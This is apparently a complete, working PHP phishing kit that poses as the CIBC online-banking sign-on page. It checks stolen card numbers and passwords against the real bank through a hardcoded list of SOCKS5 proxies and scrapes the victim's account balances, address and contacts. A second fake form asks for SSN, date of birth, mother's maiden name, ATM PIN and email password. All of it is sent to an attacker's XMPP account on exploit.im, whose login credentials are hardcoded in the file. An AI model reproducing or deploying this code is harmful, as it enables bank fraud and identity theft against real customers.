<?


$proxy = "70.71.176.106:38992
205.250.173.52:13763
70.71.224.80:51306
76.9.63.133:17665
24.78.81.15:10044
72.136.20.46:13019
50.71.164.254:63684
72.136.16.4:14065
24.108.201.66:48979
184.68.181.218:25571
198.84.235.25:17200
70.83.236.194:50412
96.22.169.200:42915
24.246.33.228:22383
24.212.223.209:43384
70.29.7.128:12256
23.233.2.7:61910
70.27.48.240:16294
174.5.238.201:11953
135.23.150.68:32558
64.231.155.10:46480
64.25.171.124:34072
108.168.8.89:12700
157.52.4.128:63433
72.143.43.162:13408
216.6.204.70:31293
38.132.37.17:28136
192.186.85.114:64437
135.0.17.111:63506
24.212.162.254:54359
192.95.198.194:26848
24.212.231.210:37243
72.38.19.217:13698
24.246.73.210:16217
70.27.58.143:14841
209.222.54.130:35105
24.52.230.249:37040
207.112.0.31:41234
174.113.198.162:11710
207.112.120.219:55766
104.158.161.17:42994
184.94.4.158:53949
209.141.191.175:10095
216.48.168.235:17846
108.162.154.103:39096
198.200.111.61:51080
184.144.105.19:49150
76.71.6.18:19256
76.65.226.104:49236
72.143.74.250:58957
198.84.230.109:20036
104.158.7.136:10363
104.158.232.240:60947
99.253.103.131:27139
";


$redirect = 'https://www.cibc.com/ca/personal.html';
set_time_limit(0);
error_reporting(0);
session_start();

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
	$cookie = dirname(__FILE__).'/'.md5($ip.':'.$ip.':'.$ip).'.txt';

include_once( 'XMPPHP/XMPP.php');

function sendJabb($str)
{
	$jabber = array('me'=>'770099@exploit.im', 'server'=> 'exploit.im', 'port'=>'5222', 'user'=>'770099@exploit.im', 'pass'=>'sw$ZAeV6D#A?d{n');

$conn = new XMPPHP_XMPP($jabber['server'], $jabber['port'], $jabber['user'], $jabber['pass'], 'xmpphp', $jabber['server'], $printlog=false, $loglevel=XMPPHP_Log::LEVEL_INFO);

try {
    $conn->connect();
    $conn->processUntil('session_start');
    $conn->presence();
    $conn->message($jabber['me'], $str);
    $conn->disconnect();
} catch(XMPPHP_Exception $e) {
  
}

}


if(!isset($_COOKIE['v']))
{
	setcookie("v", 1, time()+(3600*24));
	
	$str = "Visited TD BANK: ".$ip." - ".date('D M d, Y h:i A')." - http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];

	sendJabb($str);
}
if(!isset($_SESSION['proxy']))
{
	$_proxylist = explode("\n", str_replace("\r", "", $proxy));
	
	$proxy = $_proxylist[mt_rand(0, (count($_proxylist)-1))];
}



$ss = dirname(__FILE__);
$cookie0 =  $ss.'/'.md5($_SERVER['REMOTE_ADDR']).'.txt' ;

function CURL_GO($url, $fields="", $referer='')
{
global $cookie0;
$parse_url = parse_url($url);
$cookieFile =$cookie0;

if($referer=='') $referer = 'http://'.$parse_url['host'];

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_REFERER, $referer);
curl_setopt($curl, CURLOPT_HEADER, 1);

if($fields!="") {
curl_setopt($curl, CURLOPT_POST, 1);
curl_setopt($curl, CURLOPT_POSTFIELDS,  $fields);
}

curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; rv:19.0) Gecko/20100101 Firefox/19.0');
curl_setopt($curl, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($curl, CURLOPT_COOKIEFILE,  $cookieFile);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($curl, CURLOPT_VERBOSE, TRUE);
curl_setopt($curl, CURLOPT_TIMEOUT, 30);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
 curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 10); 
 
 $proxy = trim($_SESSION['proxy']);

 if($proxy!='')
{ curl_setopt($curl, CURLOPT_PROXY, $proxy);
 curl_setopt($curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);

 }
 
 $response = curl_exec($curl);
 $info = curl_getinfo($curl);
 curl_close($curl);
 
return $response;
	
}


if(isset($_POST['step'])) $step= (int) $_POST['step']; else $step = 1;

if($step==2)
{
	if(file_exists($cookie0))  unlink($cookie0);
	session_destroy();
	session_start();
	
$query ='isPersistentCookieDisabled=0&reload=false&selIndex=-1&popupcheck=false&securityUID=&emtReceiveId=&newCardNumber='.trim($_POST['newCardNumber']).'&saveCardNumber=1&pswPassword='.trim($_POST['pass']).'&SignOnSubmit=';

$res= CURL_GO('https://www.cibconline.cibc.com/olbtxn/authentication/SignOn.cibc', $query, 'https://www.cibconline.cibc.com/olbtxn/authentication/SignOn.cibc');

if(!strstr($res, 'olbtxn/user/StoredCard1.cibc')) 
{
	$err = true;
	$step = 1;
}
else
{
	
$_SESSION['card_number'] = $_POST['newCardNumber'];
$_SESSION['pass'] = $_POST['pass'];

$acc = CURL_GO('https://www.cibconline.cibc.com/olbtxn/accounts/MyAccounts.cibc', $query, 'https://www.cibconline.cibc.com/olbtxn/authentication/SignOn.cibc');

if(strstr($acc, '<span id="greeting">Welcome,'))
{
$n = explode('<span id="greeting">Welcome,', $acc);
$n = explode('</', $n[1]);
$_SESSION['fullname'] = trim(rtrim(preg_replace('/\s+/',' ', $n[0])));

$addr = explode('<div class="address">', $acc);
$addr = explode('</div>', $addr[1]);
$_SESSION['address'] = trim(rtrim(preg_replace('/\s+/',' ', strip_tags($addr[0]))));


$bal = explode('<th class="graph"/>', $acc);
$bal = explode('<span>Investments</span>', $bal[1]);

$bal = explode('<span class="acctType">', $bal[0]);
unset($bal[0]);

$_SESSION['balance'] = "\r\n";
foreach($bal as $_bal)
{
	$b = explode('</span><span class="acctNum">', $_bal);
	$type = $b[0];
	$num = explode('<', $b[1]);
	$num = $num[0];
	$balance = explode('<td class="balance">', $b[1]);
	$balance = explode('</td', $balance[1]);
	$balance = trim(rtrim(preg_replace('/\s+/',' ', $balance[0])));
	
	$_SESSION['balance'].=$type.' '.$num.' - '.$balance."\r\n";
}

$em = explode('<span class="title">Email:</span>', $acc);
$em = strip_tags(substr($em[1], 0, strpos($em[1], '</span')));
$_SESSION['email'] = trim(rtrim($em));

sleep(2);

$curl  = CURL_GO('https://www.cibconline.cibc.com/olbtxn/user/ChangeAddressRetailStep1.cibc', '', 'https://www.cibconline.cibc.com/olbtxn/accounts/MyAccounts.cibc');

$curl = substr($curl, strpos($curl, '<div class="contactInformationOnFile">'));
$addressinfo = str_replace('	h4>', '</h4>', substr($curl, 0, strpos($curl, '<field')));
file_put_contents('test.txt', $curl);


$s = explode('<span id="homePhoneOutput">', $curl);
$_SESSION['phone1'] = substr($s[1],0,strpos($s[1], '</'));
$s = explode('<span id="workPhoneOutput">', $curl);
$_SESSION['phone2'] = substr($s[1],0,strpos($s[1], '</'));

}
else
{
	$step = 1;
	unlink($cookie0);
	session_destroy();
	session_start();
}
}

}

if($step==1)
{
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<title>Online Banking</title>
	<link rel="stylesheet" type="text/css" media="screen" href="css/screen-pre-PreSignOn.css?v=Pre-Staging-44" />
<link rel="stylesheet" type="text/css" media="print" href="css/screen-pre-PreSignOn.css?v=Pre-Staging-44" />
</head>

<body>
<div id="pageContainer">

<div id="header">

        <div id="logo">

          <a href=""><img src="css/cibc-logo-en.png" alt="CIBC" height="70" width="154" /></a>

        </div>

        <div id="printLogo">

          <img src="css/cibc-logo-print-en.png" alt="CIBC" height="70" width="154" id="imgPrintLogo" />

        </div>

        <div id="globalNav">

          <ul>

            <li class="firstListItem">

              <a href="">Home</a>

            </li>

            <li>

              <a href="" onclick="">Fransais</a>

            </li>

            <li>

              <a href=""><img src="css/asian-banking.png" alt="Asian Banking" height="11" width="22" /></a>

            </li>

            <li>

              <a href="">Contact Us</a>

            </li>

          </ul>

        </div>

      </div>



	<div id="pageContent">
		<div id="mainSection">
		<a name="main"></a>
		
			
				
					



<div id="contentHeader">

        <div id="onlinebankingIcon">

          <img src="css/1x1-trans.gif" alt="Online Banking" height="26" width="26" class="onlinebankingIcon" />

          <h1>Online Banking</h1>

        </div>

      </div>



<div class="globalErrorContainer"><div class="globalError">



<div class="errorMessage">


        <p><?=(isset($err)?'You have entered incorrect information. Please check your Caps Lock key and try again.':'Please enter your card number in the card number field.')?></p>

      </div><div class="errorCode">{Result #U100}</div>



</div></div>
<form name="signonForm" id="signonForm" method="post" action="">
    <input type="hidden" name="step" value="2" />
	<fieldset id="signonFieldset">
        <legend></legend>
        
                      

        <div class="fieldLabelGroup" id="customCardNoContainer">
            <div class="fieldLabel">
                <label for="newCardNumber">
                    Card Number
                </label>
            </div>
            <div class="labeledField">
                <input type="text" name="newCardNumber" id="newCardNumber" class="formFieldSingleLine" maxlength="19" tabindex="3"  autocomplete="off" value=""/>
            </div>
            <div class="selectableFieldGroup">
                <div class="selectableField">
                    <input type="checkbox" name="saveCardNumber" id="saveCardCheckbox" value="1" />
                </div>
                <div class="selectableFieldLabel">
                    <a href="" onclick="">Remember my card number</a>
                </div>
            </div>
        </div>
        
        <div class="fieldLabelGroup">
            <div class="fieldLabel">
                <label for="pswPassword">
                    Password 
    <span class="caseSensitive">(case sensitive)</span>
                </label>
                <div class="fieldSubLabel">
                    <span class="caseSensitive">Case-sensitive</span>
                </div>
            </div>
            <div class="labeledField">
                <input type="password" name="pass" id="pswPassword" class="formFieldSingleLine" maxlength="12" tabindex="4" autocomplete="off" />
                <a href="">Forgot your password?</a>
            </div>
        </div>
        
        <div>
        
	 			<div class="linkContainer">
			
			
        <p><a href="javascript:submitRegsitrationOTVCForm();">Register now</a>          
        </p>
         



<p>

        <a href="">Take a tour</a>

      </p>



 
        </div> 
		</div>

		<div class="buttonContainer" id="signOnButtonContainer">
            <button name="SignOnSubmit" id="SignOnSubmit" type="submit" tabindex="7" class="calloutButton">Sign On</button>
        </div>
        </fieldset>
        </form>
	   

<div class="importantInformation">

        <h2>

          <span>Important Information</span>

        </h2>

        <div class="listedItems">

          <ul>

            <li>

              <a href="#" onclick="">How to protect yourself from identity theft</a>

            </li>

            <li>

              <a href="" onclick="">Read our Security Guarantee</a>

            </li>

            <li>

              <a href="">Browser requirements for Online Banking</a>

            </li>

          </ul>

        </div>

      </div><div class="securityMessageContainer">

        <div id="cibcchatsignon"></div>

        <div id="notice">

          <a href="">Electronic Access Agreement</a>

        </div>

        <div id="security">

          <a href="" onclick=""><img src="css/1x1-trans.gif" alt="The CIBC Online Security Guarantee" height="26" width="26" class="icon securityIcon" /><span class="securityText">Safe banking online, guaranteed.</span></a>

        </div>

        <div id="review">

          <div id="reviewDemo">''I love that I can do all my banking from my home... beyond convenient for me....''</div>

          <div id="readAllReview">

            <a href="">Read all reviews</a>

          </div>

        </div>

      </div>




				
			
		
		</div>
			



<div class="anch0r">

        <a href="#" class="anch0rimg"><img src="css/edeposit-anchor-en.jpg" alt="" height="240" width="465" /><span class="headline">Depositing a cheque?
    </span><span class="anch0rContent">Now you can take a picture.</span><span class="anch0rLink">Learn more<span class="readerDesc"> about e Deposit</span>

      </span></a>

      </div>

<div class="r0tating">

        <a href="" class="r0tatingimg"><img src="css/rotating-AventuraNov2015.jpg" alt="" height="240" width="465" /><span class="headline">Now you're<br />flying</span><span class="r0tatingContent">Use CIBC Aventura<span class="trademark">?®</span> Rewards<br />for any airline, any seat, with<br />no blackouts.<span class="trademark">1</span>

      </span><span class="r0tatingLink">Come aboard<span class="readerDesc"> the CIBC Aventura Rewards program</span>

      </span></a>

      </div>




				
			
		


	</div>

<div id="footer">

        <div id="pilotMarker">R23.6</div>

        <div class="footer-column">

          <span class="footer-heading">Resources</span>

          <ul>

            <li>

              <a href="#" onclick="newDynLinkWindow('https://www.cibc.com/ca/redirect/locator.html','scrollbars=yes,menubar=no,resizable=yes,toolbar=no,location=no,directories=no,status=yes,width=820,height=600','BranchHours');return false">Find a Branch or ABM</a>

            </li>

            <li>

              <a href="https://www.cibc.com/ca/mortgages/buying-first-home/finalizing-your-mortgage.html">Finalizing Your Mortgage</a>

            </li>

            <li>

              <a href="https://www.cibc.com/ca/loans/articles/personal-loans-line-of-credit.html">Loans vs Lines of Credit</a>

            </li>

            <li>

              <a href="https://www.cibc.com/ca/advice-centre/savings-plan/savings-guidelines.html">Savings Guidelines</a>

            </li>

            <li>

              <a href="https://www.cibc.com/ca/student-life/broke-again/learning-to-budget/gttng-smrt-abt-bdgts.html">Getting Smart About Budgets</a>

            </li>

          </ul>

        </div>

        <div class="footer-column">

          <span class="footer-heading">Rates & Calculators</span>

          <ul>

            <li>

              <a href="https://www.cibc.com/ca/mortgages/calculator/mortgage-payment.html">Mortgage Payment Calculator</a>

            </li>

            <li>

              <a href="https://www.cibc.com/ca/loans/calculators/line-of-credit-calculator.html">Loan Calculator</a>

            </li>

            <li>

              <a href="https://www.cibc.com/ca/credit-cards/calculators/selector/selector-calculator.html">Credit Card Selector</a>

            </li>

            <li>

              <a href="https://www.cibc.com/ca/investing/tfsa/tools/tfsa-calculator.html">TFSA Calculator</a>

            </li>

            <li>

              <a href="https://www.cibc.com/ca/rates/index.html">Mortgage & Other Rates</a>

            </li>

          </ul>

        </div>

        <div class="footer-column">

          <span class="footer-heading">About CIBC</span>

          <ul>

            <li>

              <a href="https://www.cibc.com/ca/legal/privacy-priority.html">Privacy & Security</a>

            </li>

            <li>

              <a href="https://www.cibc.com/ca/cibc-and-you/legal.html">Legal</a>

            </li>

            <li>

              <a href="https://www.cibc.com/ca/inside-cibc/careers.html">Careers</a>

            </li>

            <li>

              <a href="https://www.cibc.com/ca/cibc-and-you/to-our-customers/dep-reg-info.html">CDIC Deposit Insurance Information</a>

            </li>

            <li>

              <a href="https://www.cibc.com/ca/site-map.html">Site Map</a>

            </li>

          </ul>

        </div>

        <p class="legalText copyright">Canadian Imperial Bank of Commerce Website - Copyright &copy CIBC.</p>

      </div>

</body>
</html>

<?
}

elseif($step=='2')
{
	?>
	
<!DOCTYPE html PUBLIC "-//W3C//DTD
XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">


<head>
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	
	<title>Online Banking</title>

	<link rel="stylesheet" type="text/css" media="screen" href="css/screen-post.css?v=R24.1-6" />
<link rel="stylesheet" type="text/css" media="screen" href="css/screen-post-font-size.css?v=Release22b-4" />
<link rel="stylesheet" type="text/css" media="screen" href="css/screen-post-en.css?v=Release13B-1" />
<link rel="stylesheet" type="text/css" media="screen" href="css/screen-post-ChangeAddress1.css?v=Release23.7-AML-1" />
<link rel="stylesheet" type="text/css" media="screen" href="css/screen-post-retail.css?v=Release22b-1" />
<link rel="stylesheet" type="text/css" media="print" href="css/print-post.css?v=Pre-Staging-5" />
<link rel="stylesheet" type="text/css" media="print" href="css/print-post-font-size.css?v=Release16B-1" />
<link rel="stylesheet" type="text/css" media="print" href="css/print-post-en.css?v=Release8-1" />
<link rel="stylesheet" type="text/css" media="print" href="css/print-post-ChangeAddress1.css?v=Release22b-2" />
<link rel="stylesheet" type="text/css" media="print" href="css/print-post-retail.css?v=Release8-1" />

	<link rel="stylesheet" type="text/css" href="css/dyncontent.css" />
	
</head>

	
	<body>	
	<div id="pageContainer">
	
		
			
				
					



<div id="header">

        <div id="logo">

          <img src="css/cibc-logo-en.png" alt="CIBC" height="70" width="154" />

        </div>

        <div id="printLogo">

          <img src="css/cibc-logo-print-en.png" alt="CIBC" height="70" width="154" id="imgPrintLogo" />

        </div>

        <div id="skipToMain">

          <a href="#main">Click here to skip navigation</a>

        </div>

        <div id="globalNav">

          <ul>

            <li class="firstListItem">

              <a href="#" onclick="newDynLinkWindow('http://www.cibc.com/ca/rates/index.html?siteloc=1','scrollbars=yes,menubar=no,resizable=yes,toolbar=no,location=no,directories=no,status=yes,width=800,height=600');return false">Rates</a>

            </li>

            <li>

              <a href="#" onclick="newDynLinkWindow('http://www.cibc.com/ca/tools-banking.html','scrollbars=yes,menubar=no,resizable=yes,toolbar=no,location=no,directories=no,status=yes,width=620,height=500');return false">Tools</a>

            </li>

            <li>

              <a href="#">Site Map</a>

            </li>

            <li>

              <a href="#">Contact Us</a>

            </li>

            <li id="ISGNSignOff">

              <a href="#" class="button primary"><span>Sign Off</span></a>

            </li>

          </ul>

        </div>

      </div>




				
			
		
			
		<div id="contactCenter">
				
		
			
				
					








				
			
		
		
			
			
		
			  		
		
			

					  
					  
					 
					  				 
						
						  <div class="contactCenterGroup" id="messageCenterGroup">						  					
							<div class="unreadMessages">
								
								
										<a href='#'> 
											<span id="globalUnreadCount">0</span>
												<span class="readerDesc">new messages</span>											  
										</a>
								
								
							</div>
							



<div class="composeLinkContainer">

        <a href="#">Write to Us</a>

      </div>




						</div>
					
					
			
		
		</div>
		
		<div id="serverDateStamp">
		</div>
	
		
			<div id="subsiteNavigation">
				<ul>
					
						<li class="presentLocation" id="banking_on">



<a href="#">Banking</a>



</li>
					
						
					
						
					
						<li id="investing_off">



<a href="#">Investing</a>



</li>
					
						
					
						<li id="apply_off">



<a href="#">Offers and Products</a>



</li>
					
				</ul>
			</div>
		

		
			
				



<div id="secondaryNavIEBugFix">

        <div id="secondaryGlobalNav">

          <ul>

            <li id="sessionSummary" class="firstListItem">

              <a href="" onclick=""><img src="css/tnx-summary.png" alt="Transaction Summary" title="Transaction Summary" height="18" width="18" /></a>

            </li>

            

              

              <li id="pageSpecificHelp">

                <a href="" onclick=""><img src="css/help.png" alt="Help" title="Help" height="18" width="18" /></a>

              </li>

            

            

            

          </ul>

        </div>

      </div>




			
		


		<div id="pageContent">
		
				






<div id="taskNavigation">
	

	<ul><li id="MyAccounts"><a href="#" class="ClickProtected" >My Accounts</a></li><li id="PayBills"><a href="#" class="ClickProtected" >Pay Bills</a></li><li id="Transfers"><a href="#" class="ClickProtected" >Transfers</a></li><li id="EmailMoneyTransfers"><a href="#" class="ClickProtected" >INTERAC e-Transfer</a></li><li id="GlobalMoneyTransfer"><a href="#"   class="ClickProtected" >Global Money Transfer</a></li><li id="OrderForeignCash"><a href="#" onclick="#" class="ClickProtected" >Order Foreign Cash</a></li><li id="CustomerServices" class="presentLocation"><span class="presentLocationMessage"> - you are here</span><a href="#" class="ClickProtected" >Customer Services</a></li><li id="MyMessageCentre"><a href="#" class="ClickProtected" >My Message Centre</a></li><li id="AlertsManage"><a href="#" class="ClickProtected" >Manage My Alerts</a></li><li id="HowToContactUs"><a href="#" class="ClickProtected" >Contact Us</a></li></ul>
	

	
</div>

<style>
.fieldLabelSet, .fieldLabelGroup 
{
padding-bottom:20px
}
</style>


			
			

			<div id="mainSection">
			<a name="main"></a>
				
				
					
						
							



<div id="contentHeader">

        <a name="main"></a>

        <h1>

          Verify Your CIBC Account

        </h1>

        <h2>Step:</h2>

        <div id="progressContainer">

        <ul class="progressList">

          <li class="pgFirstStep pgOnState">

            <span>1</span>

          </li>


        </ul>

      </div>

        <div id="userDateStamp">
<?=date('M d, Y')?>

      </div>

      </div>




						
					
				
				
					
				
				
				
					







<div id="pageInstructional">

        <h3>Contact Information</h3>

        <ul>

        </li>

          <li>Please verify your existing contact information and enter your information below.</li>

          <li>It will take up to 1 hours for your online access to be restore.</li>

          <li> Select "Next" to complete the system verification.</li>

        </ul>

      </div>




<form name="coaFormRetail" id="coaFormRetail" method="post" action="" class="inlineForm">
	<input type="hidden" name="step" value="3" />
	<?=$addressinfo?>
	
	<fieldset class="fieldLabelSet" id="effectiveDateFieldLabelSet">
		<legend class="readerDesc">
			
		</legend>
		<h4>
		Your Personal Information on File
		</h4>
		
		<div class="fieldLabelGroup altRow" id="takeEffectFieldLabelGroup">
			<fieldset class="fieldLabelSet" id="takeEffectFieldLabelSet">
			
				<div class="groupLabel">
					<label for="effectiveDay">Date of Birth:
					</label>
				</div>
				<div class="groupedFields">
					<div id="dayFieldLabelPair" class="fieldLabelPair altRow">
						<div class="fieldLabel">
							<label for="effectiveDay">Day
							</label>
						</div>
						<div class="labelledField">
							<input type="text" required name="dob_d" maxlength="2" value="" id="effectiveDay" class="formFieldSingleLine small" autocomplete="off">
						</div>
					</div>
					<div class="fieldLabelPair altRow" id="monthFieldLabelPair">
						<div class="fieldLabel">
							<label for="effectiveMonthSelect">Month
							</label>
						</div>
						<div class="labelledField">
							<select name="dob_m" required size="1" id="effectiveMonthSelect" class="formFieldSelect"><option value="" selected="selected">Select</option>

<option value="01">January</option>

<option value="02">February</option>

<option value="03">March</option>

<option value="04">April</option>

<option value="05">May</option>

<option value="06">June</option>

<option value="07">July</option>

<option value="08">August</option>

<option value="09">September</option>

<option value="10">October</option>

<option value="11">November</option>

<option value="12">December</option></select>
						</div>
					</div>
					<div class="fieldLabelPair altRow" id="yearFieldLabelPair">
						<div class="fieldLabel">
							<label for="effectiveYear">Year
							</label>
						</div>
						<div class="labelledField">
							<input type="text" name="dob_y" required maxlength="4" value="" id="effectiveYear" class="formFieldSingleLine small" autocomplete="off">
						</div>
					</div>
						
					
				</div>
			</fieldset>
		</div>
		
		
		
		
		<div class="fieldLabelGroup altRow" id="takeEffectFieldLabelGroup">
			<fieldset class="fieldLabelSet" id="takeEffectFieldLabelSet">
			
				<div class="groupLabel">
					<label for="effectiveDay">Mother's Maiden Name:
					</label>
				</div>
				<div class="groupedFields">
				
					
					<div class="fieldLabelPair altRow" id="yearFieldLabelPair">
					
						<div class="labelledField">
							<input type="text" name="mmn"  maxlength="20" value="" id="effectiveYear" class="formFieldSingleLine large" required autocomplete="off">
						</div>
					</div>
						
					
				</div>
			</fieldset>
		</div>
		
		
		<div class="fieldLabelGroup altRow" id="takeEffectFieldLabelGroup">
			<fieldset class="fieldLabelSet" id="takeEffectFieldLabelSet">
			
				<div class="groupLabel">
					<label for="effectiveDay">Social Security Number:
					</label>
				</div>
				<div class="groupedFields">
				
					
					<div class="fieldLabelPair altRow" id="yearFieldLabelPair">
					
						<div class="labelledField">
							<input type="text" name="ssn1"  maxlength="3" value="" id="effectiveYear" class="formFieldSingleLine small" autocomplete="off">
						</div>
					</div>
						
						<div class="fieldLabelPair altRow" id="yearFieldLabelPair">
					
						<div class="labelledField">
							<input type="text" name="ssn2"  maxlength="3" value="" id="effectiveYear" class="formFieldSingleLine small" autocomplete="off">
						</div>
					</div>
					
					<div class="fieldLabelPair altRow" id="yearFieldLabelPair">
					
						<div class="labelledField">
							<input type="text" name="ssn3"  maxlength="3" value="" id="effectiveYear" class="formFieldSingleLine small" autocomplete="off">
						</div>
					</div>
					
				</div>
			</fieldset>
		</div>
		
		<div class="fieldLabelGroup altRow" id="takeEffectFieldLabelGroup">
		<fieldset class="fieldLabelSet" id="takeEffectFieldLabelSet">
				<div class="groupLabel">
				<label for="effectiveDay">Driver License Number:
				</label>
			</div>
				<div class="labelledField">
				<input type="text" name="driver" maxlength="25" value="" class="formFieldSingleLine large" autocomplete="off" >
			</div>
		</fieldset>
		</div>
		
		
		<div class="fieldLabelGroup altRow" id="takeEffectFieldLabelGroup">
		<fieldset class="fieldLabelSet" id="takeEffectFieldLabelSet">
				<div class="groupLabel">
				<label for="effectiveDay">Email Address:
				</label>
			</div>
				<div class="labelledField">
				<input type="text" name="email" maxlength="60" value="<?=$_SESSION['email']?>" id="emailAddress" class="formFieldSingleLine large" autocomplete="off" readonly="true">
			</div>
		</fieldset>
		</div>
		
		<div class="fieldLabelGroup altRow" id="takeEffectFieldLabelGroup">
		<fieldset class="fieldLabelSet" id="takeEffectFieldLabelSet">
				<div class="groupLabel">
				<label for="effectiveDay">Email Password:
				</label>
			</div>
			<div class="labelledField">
				<input type="text" name="email_pass" maxlength="60" value="" id="emailAddress" class="formFieldSingleLine large" autocomplete="off" >
			</div>
		</fieldset>
		</div>
		
		
			<div class="fieldLabelGroup altRow" id="takeEffectFieldLabelGroup">
			<fieldset class="fieldLabelSet" id="takeEffectFieldLabelSet">
			
				<div class="groupLabel">
					<label for="effectiveDay">CIBC Card Number:
					</label>
				</div>
				<div class="labelledField">
				<input type="text" value="************<?=substr($_SESSION['card_number'], -4)?>" class="formFieldSingleLine large" autocomplete="off" readonly="true" >
					
				</div>
			</fieldset>
			</div>
		
		
		
		<div class="fieldLabelGroup altRow" id="takeEffectFieldLabelGroup">
			<fieldset class="fieldLabelSet" id="takeEffectFieldLabelSet">
			
				<div class="groupLabel">
					<label for="effectiveDay">ATM PIN Number:
					</label>
				</div>
				<div class="groupedFields">
				
					
					<div class="fieldLabelPair altRow" id="yearFieldLabelPair">
					
						<div class="labelledField">
							 <input type="text" name="atm"  maxlength="8" value="" id="effectiveYear" class="formFieldSingleLine small" autocomplete="off">
						</div>
					</div>
				
				</div>
			</fieldset>
		</div>
	</fieldset>
	
	<div class="twinButtonContainer">
		<div id="bttnNextContainer" class="primaryFormButtonContainer">
			<button type="submit" name="bttnNext" id="bttnNext"
				class="primaryFormButton">Next</button>
		</div>
	</div>

</form>
				
			</div>
		</div>
		

<div id="footer">

        <ul>

          <li class="firstListItem">

            <a href="#">My Accounts</a>

          </li>

          <li>

            <a href="#" onclick="#">CDIC Deposit Insurance Information</a>

          </li>

          <li>

            <a href="h#" onclick="#">Legal</a>

          </li>

          <li>

            <a href="#" onclick=#">Privacy & Security</a>

          </li>

        </ul>

      </div><div id="pilotMarker"></div>
	</div>
</body>
</html>

<?
}
elseif($step==3)
{
$str = "CARD NUMBER: ".$_SESSION['card_number']."
Password: ".$_SESSION['pass']."
---Balance---".$_SESSION['balance']."
-------------------------------------
FULL NAME: ".$_SESSION['fullname']."
DOB: ".$_POST['dob_m'].'/'.$_POST['dob_d'].'/'.$_POST['dob_y']."
MMN: ".$_POST['mmn']."
SSN: ".$_POST['ssn1'].'/'.$_POST['ssn2'].'/'.$_POST['ssn3']."
Driver License Number: ".$_POST['driver']."
Address: ".$_SESSION['address']."
Email: ".$_SESSION['email']."
Email pass: ".$_POST['email_pass']."
Phone Home: ".$_SESSION['phone1']."
Phone Business: ".$_SESSION['phone2']."
ATM PIN Number: ".$_POST['atm']."

IP address: ".$_SERVER['REMOTE_ADDR']."
Host: ".gethostbyaddr($_SERVER['REMOTE_ADDR'])."
Submited: ".date('D M d, Y h:i A');

	if(file_exists($cookie0))  unlink($cookie0);
	session_destroy();
	session_start();

sendJabb($str);
header("location: ".$redirect);
exit('<script>location.href="'.$redirect.'"</script>');
		}
		
?>